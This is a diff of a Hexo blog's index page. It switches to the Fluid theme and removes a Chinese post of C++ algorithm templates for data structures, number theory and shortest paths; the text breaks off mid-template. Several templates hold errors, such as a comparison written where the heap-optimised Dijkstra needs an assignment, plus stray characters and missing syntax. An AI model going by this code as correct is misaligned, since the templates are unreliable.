@@ -1,383 +1,454 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
   
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
+    <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
+<meta name="twitter:card" content="summary_large_image">
   
   
   
-<link rel="stylesheet" href="/css/style.css">
+  <title>Hexo</title>
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
+
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
   
 <meta name="generator" content="Hexo 7.1.1"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <a class="main-nav-link" href="/">Home</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
         
-      </nav>
-      <nav id="sub-nav">
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
         
         
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-算法模板大全" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/02/18/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E5%A4%A7%E5%85%A8/" class="article-date">
-  <time class="dt-published" datetime="2024-02-17T16:00:00.000Z" itemprop="datePublished">2024-02-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/02/18/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E5%A4%A7%E5%85%A8/">算法模板大全</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <hr>
-<p>一、基本数据结构<br>1.并查集<br> （1）作用 将两个集合合并，询问两个数据是否在一个集合当中；<br> （2）模版<br> &#x2F;&#x2F;朴素版模版</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">      <span class="keyword">if</span>(p[x]!=x) p[x]=<span class="built_in">find</span>(p[x]);</span><br><span class="line">      <span class="keyword">return</span> p[x];</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="comment">//带权重边并查集</span></span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(p[x]!=x)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="type">int</span> temp=<span class="built_in">find</span>(p[x]);</span><br><span class="line">         d[x]+=d[p[x]];</span><br><span class="line">         p[x]=temp;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> p[x];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-
-<p>2.单调队列<br>  充分利用单调性来解决类似单调栈、求滑动窗口里面的最大值、最小值的问题<br>可以先去暴力枚举，然后思考该题的性质，结合单调性和栈的性质来进行优化<br>需要思考清楚，什么时候队首出去，什么时候弹出队尾元素，以及当前的队列里面存储的值是序号还是当前值，这是非常重要的<br>对于普通队列来讲，可以用数组模拟队列</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hh 表示队头，tt表示队尾</span></span><br><span class="line">   <span class="type">int</span> q[N],hh=<span class="number">0</span>,tt=<span class="number">-1</span>;</span><br><span class="line">   <span class="comment">//向队尾插入一个数</span></span><br><span class="line">   q[++tt]=x;</span><br><span class="line">   <span class="comment">//从队头弹出一个元素</span></span><br><span class="line">   hh++；</span><br><span class="line">   <span class="comment">//队头取值</span></span><br><span class="line">   q[hh];</span><br><span class="line">   <span class="comment">//如果hh&lt;=tt,则表示档当前队列不为空</span></span><br></pre></td></tr></table></figure>
-
-<p>3.trie树<br>用来快速存储来查找字符串集合的数据结构</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> son[N][<span class="number">26</span>],cnt[N],idx;</span><br><span class="line"><span class="comment">// 0号点即是根节点，又是空节点</span></span><br><span class="line"><span class="comment">//son[][]存储树中每个节点的子节点</span></span><br><span class="line"><span class="comment">//cnt[]存储以每个节点结尾的单词数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//插入一个字符串</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> p=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;str[i];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> u=str[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!son[p][u]) son[p][u]=++idx;</span><br><span class="line">        p=son[p][u];</span><br><span class="line">    &#125;</span><br><span class="line">    cnt[p]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询字符串出现的次数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> p=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;str[i];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> u=str[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!son[p][u]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        p=son[p][u];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt[p];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>x，右儿子是2*x+1；<br>（2）</p>
-<p>堆所支持的操作：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）插入一个数 </span><br><span class="line">    heap[++size]=x;<span class="built_in">up</span>(size);</span><br><span class="line">（<span class="number">2</span>）求集合当中的最小值</span><br><span class="line">    heap[<span class="number">1</span>];</span><br><span class="line">（<span class="number">3</span>）删除最小值</span><br><span class="line">    heap[<span class="number">1</span>]=heap[size];size--; down[<span class="number">1</span>]</span><br><span class="line">（<span class="number">4</span>）删除任意一个元素<span class="comment">//stl中的堆（优先队列）不可以直接实现</span></span><br><span class="line">    heap[k]=heap[size];size--;<span class="built_in">down</span>(k),<span class="built_in">up</span>(k);</span><br><span class="line">（<span class="number">5</span>）修改任意一个元素<span class="comment">//stl中的堆不可以直接实现</span></span><br><span class="line">    heap[k]=x,<span class="built_in">down</span>(k),<span class="built_in">up</span>(k);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// h[N]存储堆中的值, h[1]是堆顶，x的左儿子是2x, 右儿子是2x + 1</span></span><br><span class="line"><span class="type">int</span> h[N], ph[N], hp[N], size;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t = u;</span><br><span class="line">    <span class="keyword">if</span> (u * <span class="number">2</span> &lt;= cnt &amp;&amp; h[u * <span class="number">2</span>] &lt; h[t]) t = u * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (u * <span class="number">2</span> + <span class="number">1</span> &lt;= cnt &amp;&amp; h[u * <span class="number">2</span> + <span class="number">1</span>] &lt; h[t]) t = u * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (u != t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">swap</span>(h[u], h[t]);</span><br><span class="line">        <span class="built_in">down</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>&#x2F;&#x2F; O(n)建堆</p>
-<blockquote>
-<p>for (int i &#x3D; n &#x2F; 2; i; i – ) down(i);</p>
-</blockquote>
-<p>二、数论<br>1、筛质数</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> primes[N],cnt;</span><br><span class="line">  <span class="type">bool</span> st[N];</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">get_primes</span><span class="params">(<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span>(!st[i]) primes[cnt++]=i;</span><br><span class="line">          <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;primes[j]&lt;=n/i;j++)</span><br><span class="line">          &#123;</span><br><span class="line">              st[primes[j]*i]=<span class="literal">true</span>;</span><br><span class="line">              <span class="keyword">if</span>(i%primes[j]==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<p>2、最大公约数</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b?<span class="built_in">gcd</span>(b,a%b):a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">3</span>、快速幂</span><br><span class="line"><span class="function">LL <span class="title">qmi</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LL res = <span class="number">1</span> % p;</span><br><span class="line">    <span class="keyword">while</span> (b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (b &amp; <span class="number">1</span>) res = res * a % p;</span><br><span class="line">        a = a * (LL)a % p;</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>三、图论<br>1.拓扑排序（图的宽度优先遍历的应用）<br>***有向图才会有拓扑序列<br>时间复杂度O(n+m)</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">topsort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> hh=<span class="number">0</span>,tt=<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//d[i]存储点i的入度</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(d[i]==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            q[++tt]=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(hh&lt;=tt)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t=q[hh++];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=h[t];i!=<span class="number">-1</span>;i=ne[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> j=e[i];</span><br><span class="line">            <span class="keyword">if</span>(--d[j]==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                q[++tt]=j</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tt==n<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>2、朴素dijkstra求最短路<br>int g[N][N];&#x2F;&#x2F;存储每条边<br>int dist [N];&#x2F;&#x2F;存储1号点到每个点的最短位置<br>bool st[N];存储每个节点的最短路径是否已经确定</p>
-<p>int dijkstra()<br>{<br>    memset(dist,0x3f,sizeof dist);<br>    dist[1]&#x3D;0;</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> t=<span class="number">-1</span>;<span class="comment">//在为确定最短路中的点中，寻找距离最短的点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!st[j] &amp;&amp;<span class="built_in">n</span>(t==<span class="number">-1</span> || dist[t]&gt;dist[j])</span><br><span class="line">        &#123;</span><br><span class="line">            t=j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//用t更新其他点的距离</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        dist[j]=<span class="built_in">min</span>(dist[j],dist[t]+g[t][j]);</span><br><span class="line">    &#125;</span><br><span class="line">    st[t]=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(dist[n]==<span class="number">0x3f3f3f3f</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> dist[n];</span><br></pre></td></tr></table></figure>
-<p>}<br>3.堆优化版dijkstra()</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;PII;</span><br><span class="line"><span class="type">int</span> n;<span class="comment">//点的数量</span></span><br><span class="line"><span class="type">int</span> h[N],w[N],e[N],ne[N],idx;邻接表存储所有边</span><br><span class="line"><span class="type">int</span> dist[N];<span class="comment">//存储所有点到1号点的距离</span></span><br><span class="line"><span class="type">bool</span> st[N];<span class="comment">//存储每个点的最短距离是否确定</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dijkstar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist,<span class="number">0x3f</span>,<span class="keyword">sizeof</span> dist);</span><br><span class="line">    dist[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    priority_queue&lt;PII,vector&lt;PII&gt;,greater&lt;PII&gt;&gt;heap;</span><br><span class="line">    heap.<span class="built_in">push</span>(&#123;<span class="number">0</span>,<span class="number">1</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span>(heap.<span class="built_in">size</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> t=heap.<span class="built_in">top</span>();</span><br><span class="line">        heap.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> ver=t.second,distance =t.first;</span><br><span class="line">        <span class="keyword">if</span>(st[ver]) <span class="keyword">continue</span>;</span><br><span class="line">        st[ver]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=h[ver];i!=<span class="number">-1</span>;i=ne[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> j=e[i];</span><br><span class="line">            <span class="keyword">if</span>(dist[j]&gt;distance+w[i])</span><br><span class="line">            &#123;</span><br><span class="line">                dist[j]&gt;distance+w[i];</span><br><span class="line">                heap.<span class="built_in">push</span>(&#123;dist[j],j&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dist[n]==<span class="number">0x3f3f3f3f</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>4.spfa求最短路</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int h[N],e[N],ne[N],w[N],idx;</span><br><span class="line">bool state[N];</span><br><span class="line">int dist[N];</span><br><span class="line">void spfa()</span><br><span class="line">&#123;</span><br><span class="line">    memset(dist,0x3f,sizeof dist);</span><br><span class="line">    dist[1]=0;</span><br><span class="line">    state[1]=true;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;int&gt;q;</span><br><span class="line">q.push(1);</span><br><span class="line">while(q.size())</span><br><span class="line">&#123;</span><br><span class="line">    int t=q.front();</span><br><span class="line">    q.pop();</span><br><span class="line">    state[t]=false;</span><br><span class="line">    for(int i=h[t];i!=-1;i=ne[i])</span><br><span class="line">    &#123;</span><br><span class="line">        int j=e[i];</span><br><span class="line">        if(dist[j]&gt;dist[t]+w[i])</span><br><span class="line">        &#123;</span><br><span class="line">            dist[j]=dist[t]+w[i];</span><br><span class="line">            if(!state[j])</span><br><span class="line">            &#123;</span><br><span class="line">                q.push(j);</span><br><span class="line">                state[j]=true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>}<br>  spfa判断负环</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n;      <span class="comment">// 总点数</span></span><br><span class="line"><span class="type">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="comment">// 邻接表存储所有边</span></span><br><span class="line"><span class="type">int</span> dist[N], cnt[N];        <span class="comment">// dist[x]存储1号点到x的最短距离，cnt[x]存储1到x的最短路中经过的点数</span></span><br><span class="line"><span class="type">bool</span> st[N];     <span class="comment">// 存储每个点是否在队列中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果存在负环，则返回true，否则返回false。</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">spfa</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 不需要初始化dist数组</span></span><br><span class="line">    <span class="comment">// 